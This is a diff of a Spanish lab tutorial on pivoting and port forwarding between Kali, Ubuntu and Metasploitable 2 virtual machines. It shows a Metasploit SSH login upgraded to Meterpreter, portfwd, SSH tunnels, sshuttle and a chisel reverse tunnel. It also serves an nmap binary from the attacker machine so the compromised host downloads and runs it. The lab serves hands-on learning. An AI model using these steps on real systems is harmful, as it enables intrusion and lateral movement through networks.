@@ -2,9 +2,11 @@
 description: Realizando Tunneling (pivoting) y Port Forwarding 101
 ---
 
-# Realizando Tunneling \(pivoting\) y Port Forwarding 101
+# Realizando Tunneling \(pivoting\) y Port Forwarding 101\(Hands-on Labs\)
 
-Por lo general cuando hablamos de pivoting las personas en el mundo de la informatica conocen el termino y aseguran saber lo referente al tema. Sin embargo la realidad es distinto cuando pasas a la practica \(mi caso\) en el que muchos caemos. Sin embargo, me dedique el fin de semana a realizar el lab sobre pivoting para entender su proceso y diversas tecnicas que permitan realizar el pivoting, tunneling o hasta un simple Port Forwarding, asi como aseguro en mi post de twiiter [https://twitter.com/jeg1200/status/1358634667054944258?s=20](https://twitter.com/jeg1200/status/1358634667054944258?s=20) 
+## **TL;DR**
+
+Por lo general cuando hablamos de pivoting las personas del campo de la informatica conocen el termino y aseguran saber lo referente al tema. Sin embargo la realidad es distinto cuando pasas a la practica. Sin embargo, me dedique el fin de semana a levantar un laboratorio para practicar pivoting y Port Forwarding, el objetivo de este laboratorio era entender de manera práctica las tecnicas mencionadas.
 
 El motivo de este laboratio surgio por que en la actualidad para poder realizar este tipo de practicas debes afiliarte a algunas de las plataformas que encuentras en la red y muchas de estas plataformas \(no todas\) debes realizar un pago para poder ejercer este tipo de practicas. 
 
@@ -16,39 +18,104 @@ En respuesta a esta situacion decidi realizar el lab, sin necesidad de afiliarme
 2. Ubuntu puede ser la version 18 o la ultima version
 3. Metasploitable 2
 
-Y para evitar aun mas que las maquinas puedan verse entre si usamos tanto VMware como VirtualBox.
+Para virtualizar estas máquinas utilizaremos VMware y VirtualBox.
 
-Kali configurada en la VMware
+La Kali la desplegaremos con VMware.
 
-Ubuntu y Metasploitable 2 en la VirtualBox
+La Ubuntu y Metasploitable 2 las desplegaremos VirtualBox
 
-### Configuraciones...parte 1
+### Configuraciones del Ambiente de Pruebas - Red
 
-Para nuestra Kali vamos a tener la configuracion de su red en Bridged.
+Para nuestra Kali vamos a tener la configuracion de su red en modo _**Bridged**_.
 
 ![](.gitbook/assets/image%20%286%29.png)
 
-Nuestro Ubuntu tendra conexion con dos redes, la cual sera Bridged y un adaptador Only-Host \#4 que comparte con la metasploitable.
+Nuestra Máquina con  Ubuntu tendra instalada dos tarjetas de red. Una de estas estara configurada en modo _**Bridged**_ y la otra tarjeta de red en modo _**Only-Host.**_
 
 ![](.gitbook/assets/image%20%2828%29.png)
 
-Nuestra Metasploitable tendra solo conexion al adaptador Only-Host \#4
+Nuestra Metasploitable tendra solo una tarjeta de red y estara en modo _**Only-Host**._
 
 ![](.gitbook/assets/image%20%2814%29.png)
 
-De esta manera tendremos que: Nuestra Kali comparte el mismo segmento de red que nuestra ubuntu, y nuestra ubuntu tiene acceso a la misma red que nuestra metasploitable. Pero nuesra Kali no ve la Metasploitable.
+De esta manera tendremos nuestra Kali compartiendo el mismo segmento de red que nuestra Ubuntu. Nuestra Ubuntu tendra acceso al segmento de red que comparte con la Kali y tendra visibilidad tambien sobre la Metasploitable pero nuesra Kali no lograra tener visilibidad sobre la Metasploitable.
 
-De igual manera es importante no mantener confunsion en esta parte ya que el lab puede salir mal \(creanme puede salir todo mal..\).
+Es importante realizar estas configuraciones de la manera correcta, confunsiones en esta parte provocarian que el laboratorio salga mal \(creanme puede salir todo mal...\).
 
 ![](.gitbook/assets/image%20%2830%29.png)
 
-### Configuraciones...parte 2
+De manera grafica nuestro ambiente de pruebas seria el siguiente.
 
-Agregar APACHE
+![](.gitbook/assets/untitled-document.jpg)
+
+
+
+### Configuraciones del Ambiente de pruebas - Servicios
+
+Para efectos practicas unicamente instalaremos en la Ubuntu los servicios de **SSH** y **Apache**.
+
+**SSH**: para poder alcanzar el otro segmento de red y realizar Port Forwarding.
+
+**Apache**: para demostrar que logramos alcanzar un servicio desplegado sobre **localhost** unicamente.
+
+#### Instalando y Configurando Apache
+
+Instalamos Apache
+
+```text
+apt install apache2
+```
+
+Iniciamos el servicios
+
+```text
+sudo systemctl start apache2
+```
+
+Por defecto el servicio se despliega de forma que otras maquinas pueden alcanzar el servicio desde afuera, esto debemos modificarlo para que se despliegue sobre **localhost**.
+
+El fichero que demos modificar esta en la ruta:
+
+```text
+/etc/apache2/ports.conf
+```
+
+Este fichera vendra por defecto de la siguiente manera:
+
+![](.gitbook/assets/image%20%2846%29.png)
+
+Reemplazaremos **0.0.0.0:80** por **127.0.0.1:8080**. \(Pueden escoger el puerto que ustedes decidan\).
+
+Nos quedaria asi:
+
+![](.gitbook/assets/image%20%2844%29.png)
+
+Luego reiniciamos el servicios para aplicar cambios.
+
+```text
+sudo systemctl restart apache2
+```
+
+#### Instalando y Configurando SSH
+
+Instalamos SSH Server
+
+```text
+apt install openssh-server
+```
+
+Habilitamos el servicios y lo iniciamos
+
+```text
+systemctl enable ssh
+systemctl start ssh
+```
+
+NOTA: por defecto no se permite iniciar sesion por ssh con usuario necesitan crearse un usuario nuevo o habilitar el inicio de sesion del usuario root.
 
 ## Port Forwarding
 
-### Para este lab decimidos utilizar dos tecnicas:
+### Para este lab utilizaremos dos tecnicas:
 
 * Metasploit
 * Port Forwarding o redireccionamiento de puertos con SSH local
@@ -57,27 +124,29 @@ El motivo de usar estas dos tecnicas es para aprender las maneras de realizar el
 
 ### Utilizando Metasploit
 
-Consiste en establecer una conexión segura entre un usuario remoto y las máquinas locales.
+Para esta ténica necesitaremos tener credenciales validad sobre la maquina que queremos vulnerar.
 
-En este siguiente ejemplo podremos observar como nuestra Kali a travez del metasploit puede obtenere el acceso al ubuntu y seguido redireccionar lo nuestra ubuntu puede ver en el puerto 8080 a nuestro puerto 8081 en nuestra kali.
+Consiste en establecer una conexión segura entre un usuario remoto y nuestra maquina.
+
+En el siguiente ejemplo demostrare como alcanzar el servicio de Apache que se encuentra desplegado sobre localhost \(no se puede acceder al servicio desde otra máquina\). Selecionaremos un puerto en nuestra máquina para redirigir el tráfico. Para esta técnica deberemos tener una sesion con Meterpreter.
 
 Para esto iniciamos el metasploit
 
 ```text
-sudo msfconsole
+msfconsole
 ```
 
 ingresamos el siguiente parametro
 
 ```text
 use auxiliary/scanner/ssh/ssh_login 
-set rhosts 192.168.1.139 
-set username juss 
-set password 1234 
+set rhosts <IP ADDRESS>
+set username <USERNAME>
+set password <PASSWORD>
 exploit 
-sessions -u 1 
-sessions 2 
-netstat -antp
+sessions -u 1 //para escalar nuestra sesion a meterpreter
+sessions 2 // para interactuar con la nueva sesión que fue creada
+netstat -antp //para listar los servicios activo en la máquina víctima
 ```
 
 Una vez ingresado estos parametros tendremos las siguientes salidas
@@ -86,7 +155,7 @@ Una vez ingresado estos parametros tendremos las siguientes salidas
 
 Tendremos de salida el meterpreter, el cual permite obtener una gran cantidad de información sobre un objetivo comprometido. 
 
-Y como sabemos que realmente estamos dentro de la maquina victima \(Ubuntu\)???
+Y,  ¿Como sabemos que realmente estamos dentro de la maquina victima \(Ubuntu\)?
 
 Pues.. para esto corremos el siguiente comando
 
@@ -96,11 +165,11 @@ getuid
 
 ![](.gitbook/assets/image%20%2841%29.png)
 
-Este comando permite consultar la cuenta que se esta ejecutando para el proceso del meterpreter.
+Este comando permite consultar lel usuario sobre el cual se esta ejecutando el proceso del meterpreter.
 
 Una vez que ya validamos que en efecto somos el usuario de la maquina Ubuntu necesitamos enumerar las conexiones activas que mantiene nuestro Ubuntu.
 
-Para esto ejecutamos el siguiente comando
+Para esto ejecutamos el siguiente comando:
 
 ```text
 netstat -antp
@@ -108,20 +177,22 @@ netstat -antp
 
 Este comando se traduce de la siguiente manera:
 
-* -a visualiza todas las conexiones y puertos TCP y UDP, incluyendo las que están "en escucha" \(listening\).
+* a visualiza todas las conexiones y puertos TCP y UDP, incluyendo las que están "en escucha" \(listening\).
 * n se muestran los puertos con su identificación en forma numérica y no de texto.
 * t es para especificar que sea tcp
 * p es para desplegar el PID
 
 ![](.gitbook/assets/image%20%282%29.png)
 
-Una vez ya ejecutado nuestro **netstat** podemos visualizar que para la linea 4 existe el servicio que previamente se habia configurado \(Apache2\) en la 127.0.0.1:8080
+Una vez ya ejecutado nuestro **netstat** podemos visualizar que para la linea 4 existe el servicio que previamente se habia configurado \(Apache2\) y se esta ejecutando sobre 127.0.0.1:8080.
 
-Aun asi estando ya dentro de nuestra maquina Ubuntu desde nuestro meterpreter validamos si el podemos ver la conexion en nuestro localhost sin haber realizado nuestro **Port Forwarding**
+Validamos si logramos alcanzar el servicio que esta ejecutandose en el puerto 8080 desde nuestra Kali.
 
 ![](.gitbook/assets/image%20%2842%29.png)
 
-Y en efecto... no podemos todavia desplegar la informaciòn desde nuestro localhost
+Y en efecto... no podemos alcanzar el servicio remotamente ya que se esta ejecutando sobre **localhost**.
+
+**ESTO AQUI ESTA MAL, PUSISTE LA CAPTURA ENTRANDO A LOCALHOST Y CLARO QUE NO TE IVA A DAR NADA, DEBES MOSTRAR LA CPTURA ENTRADO A LA IP DONDE ESTA CORREIENDO EL APACHE Y ASI VER QUE NO LO LOGRAS ALCANZAR.....ARREGLA ESTO**
 
 En respuesta a el intento anterior utilizaremos el siguiente comando para poder realizar nuestro Port Forwarding o redirecciòn de puertos desde nuestro meterpreter.
 
@@ -129,7 +200,7 @@ En respuesta a el intento anterior utilizaremos el siguiente comando para poder 
 portfwd add -l 8081 -p 8080 -r 127.0.0.1
 ```
 
-El comando portfwd, es un comando que funciona para realizar redirecciones de puertos. De esta manera podemos enviar todo el trafico de nuestro puerto 8080 \(Ubuntu\) a nuestro puerto 8081 \(kali\). El comando add para añadir. La bander -l indica cual sera nuestro puerto escucha, la bander -p es el puerto a cual queremos conectarnos y el flag -r es el ip de la maquina a la que nos estamos conectando.
+El comando portfwd, es un comando que funciona para realizar redirecciones de puertos. De esta manera podemos enviar todo el trafico de nuestro puerto 8080 \(Ubuntu\) a nuestro puerto 8081 \(kali\). El comando add para añadir. La flag **-l** indica cual sera nuestro puerto local donde redirigiremos el  servicio , la flag **-p** es el puerto remoto al cual queremos conectarnos y el flag **-r** es el ip de la maquina a donde redigiremos el tráfico \(nuestra máquina\).
 
 ![](.gitbook/assets/image%20%2818%29.png)
 
@@ -143,15 +214,7 @@ Y como asegura el Apache2.. It works!
 
 Se utiliza el protocolo SSH para reenviar los puertos de la aplicación desde una máquina cliente a la máquina atacante. El cliente SSH escucha las conexiones en un puerto que ha sido configurado y hace un túnel a un SSH cuando se recibe una conexión hacia nuestra Kali o maquina atacante.
 
-Para esto debemos conocer previamente el user y pass de la maquina victima.
-
-Sin embargo, para confirmar que no tenemos acceso al Apache2 de nuestro Ubuntu decidimos realizar la consulta directamente en nuestro explorador
-
-![](.gitbook/assets/image%20%2837%29.png)
-
-y pues si.. no tenemos acceso.
-
-Seguido ejecutamos el siguiente comando en nuestra consola de nuestra Kali
+Para esto debemos conocer credenciales de la maquina victima.
 
 ```text
 ssh -L 8081:localhost:8080 -N -f -l juss 192.168.1.139
@@ -168,15 +231,15 @@ Este comando se traduce de la siguiente manera:
 
 ![](.gitbook/assets/image%20%2836%29.png)
 
-Como se menciono anteriormente nuestro ssh paso al background y revisamos en nuestro explorador la ruta localhost:8081
+Nuestro proceso ssh pasa al background, revisamos en nuestro explorador la ruta localhost:8081
 
 ![](.gitbook/assets/image%20%2834%29.png)
 
-De esta manera conseguimos realizar un portForwarding entre nuestras maquinas.
+De esta manera conseguimos realizar un Port Forwarding entre nuestras maquinas.
 
-## Tunneling
+## Pivoting
 
-Este es el proceso que se utiliza para acceder a los recursos de una red desde una red publica. Quiere decir que a tavez de esta tecnica podremos llegar a una subnet dentro de una red a la que desde un principio no tenemos acceso.
+Este es el proceso que se utiliza para acceder los recursos de una red a la cual no tenemos acceso, desde una red que previamente ya hayamos vulnerado y que si tenga visibilidad sobre esta red. Quiere decir que a travez de esta tecnica podremos llegar a una redes a traves de otras redes.
 
 Para este lab como se meciono anteriormente utilizaremos el Metasploitable como victima...
 
@@ -184,9 +247,9 @@ Para este lab como se meciono anteriormente utilizaremos el Metasploitable como 
 
 Esta herramienta nos permite enrutar redes ssh como si fuese conexiones de vpn.
 
-Con el Sshuttle realizaremos una conexiòn desde nuestra kali, hacia nuestro Ubuntu, llamando a la red o ip del metasploitable
+Con el Sshuttle realizaremos una conexiòn desde nuestra kali, hacia nuestro Ubuntu, y desde la ubuntu alcanzar los recursos o servicios de la Metasploitable.
 
-Para este Lab necesitamos tener nuestras ips a mano.
+Para este Lab necesitamos tener nuestras IPs a mano.
 
 Kali
 
@@ -210,13 +273,15 @@ En este caso como ya tengo instalado el Sshuttle me saldra el siguiente mensaje
 
 ![](.gitbook/assets/image%20%2823%29.png)
 
-Seguido a la instalaciòn decidimos corroborar que en efecto no tenemos acceso a ver la Metasploitable2
+Seguido a la instalaciòn decidimos corroborar que en efecto no tenemos acceso a ver la Metasploitable2.
+
+NOTA: si les da algun tipo de error reinstalar sshuttle.
 
 ![](.gitbook/assets/image%20%2838%29.png)
 
-y en efecto, no mantenemos visibilidad sobre el equipo Metasploitable2.
+En efecto, no mantenemos visibilidad sobre el equipo Metasploitable2.
 
-En respuesta a esto decidimos ejecutar nuestro binario **Sshuttle**
+Ejecutamos nuestro binario **Sshuttle**
 
 ```text
 sshuttle -vr juss@192.168.1.139 172.16.250.129/16
@@ -230,7 +295,7 @@ La cual detallamos de la sigueintee manera:
 
 ![](.gitbook/assets/image%20%2816%29.png)
 
-Una vez ejecutado la sentencia podemos observar en nuestro explorador de la Kali la ip del metasploitable
+Una vez ejecutado la sentencia podemos observar en nuestro explorador de la Kali la IP del Metasploitable.
 
 ![](.gitbook/assets/image%20%284%29.png)
 
@@ -268,7 +333,7 @@ Una vez ya ejecutado nuestro binario de chisel asignando el trafico al puerto 80
 
 ![](.gitbook/assets/image%20%2840%29.png)
 
-Pues no... no tenemos acceso. En este punto, imaginamos que te preguntas... pero porque localhost? y ese puerto? por que no es el que señalo arriba el 8000? y si todas esas dudas la respondemos siguiendo este pequeño lab.
+Pues no... no tenemos acceso. En este punto, imaginamos que te preguntas... ¿Porque localhost? y ¿ Porque ese puerto? por que no es el que señalo arriba el 8000? y si todas esas dudas la respondemos siguiendo este pequeño lab.
 
 Seguido a esto realizamos la instalaciòn del chisel en nuestro Ubuntu
 
@@ -279,7 +344,7 @@ cd chisel/
 sudo go build -ldflags="-s -w"
 ```
 
-Supongamos que estamos ya dentro del equipo y realmente no sabemos que puertos tiene abierto el equipo del Metasploitable...
+Supongamos que estamos ya dentro del equipo y realmente no sabemos que puertos tiene abierto el equipo del Metasploitable.
 
 Para esto como ya tenemos acceso al equipo Ubuntu, podemos subir un binario del nmap y realizar el escaneo de la red. Para esto primero podemos descargar este binario de github que me fue muy util.
 
@@ -287,7 +352,7 @@ Para esto como ya tenemos acceso al equipo Ubuntu, podemos subir un binario del 
 https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
 ```
 
-Una vez ya descargado generamos nuestro pequeño servidor en python para enviar archivos a nuestra maquina victima \(Ubuntu\)
+Una vez ya descargado generamos nuestro pequeño servidor en python para enviar archivos a nuestra maquina victima \(Ubuntu\).
 
 ```text
 python -m SimpleHTTPServer 80
@@ -295,7 +360,7 @@ python -m SimpleHTTPServer 80
 
 ![](.gitbook/assets/image%20%2832%29.png)
 
-y desde nuestra Ubuntu podemos descargarlo en la carpeta de temporales \(tmp\)
+Y desde nuestra Ubuntu podemos descargarlo en la carpeta de temporales \(tmp\)
 
 ![](.gitbook/assets/image%20%2835%29.png)
 
@@ -305,7 +370,7 @@ Una vez ya descargado nuestro binario debemos darle permiso de ejecucion con el 
 chmod +x nmap
 ```
 
-y lo ejecutamos con la siguiente sentencia
+Y lo ejecutamos con la siguiente sentencia:
 
 ```text
 ./nmap -Pn 172.16.250.133
@@ -313,7 +378,7 @@ y lo ejecutamos con la siguiente sentencia
 
 ![](.gitbook/assets/image%20%2825%29.png)
 
-Al tener ya los puertos abiertos y listados de la Metasploitable 2 podemos proceder con nuestro comando de chisel.
+Al tener listados los puertos de la Metasploitable 2 podemos proceder con nuestro comando de chisel.
 
 ```text
 ./chisel client 192.168.1.144:8000 R:5000:172.16.250.133:80
@@ -325,15 +390,15 @@ Lo cual se detalla a continuacion:
 * R:5000 sera el puerto que veremos la conexiòn de nuestro kali
 * :172.16.250.133:80 representa la ip de nuestro equipo Metasploitable con el puerto 80
 
-Al ejecutar este comando tendremos la siguiente salida
+Al ejecutar este comando tendremos la siguiente salida.
 
 ![](.gitbook/assets/image%20%281%29.png)
 
-Y en nuestra kali veremos que obtuvimos la sesion 1
+Y en nuestra kali veremos que obtuvimos la sesion 1.
 
 ![](.gitbook/assets/image%20%2827%29.png)
 
-Revisamos nuestro explorador con la direcciòn del localhost:5000
+Revisamos nuestro explorador con la direcciòn del **localhost:5000**.
 
 ![](.gitbook/assets/image%20%2819%29.png)
 
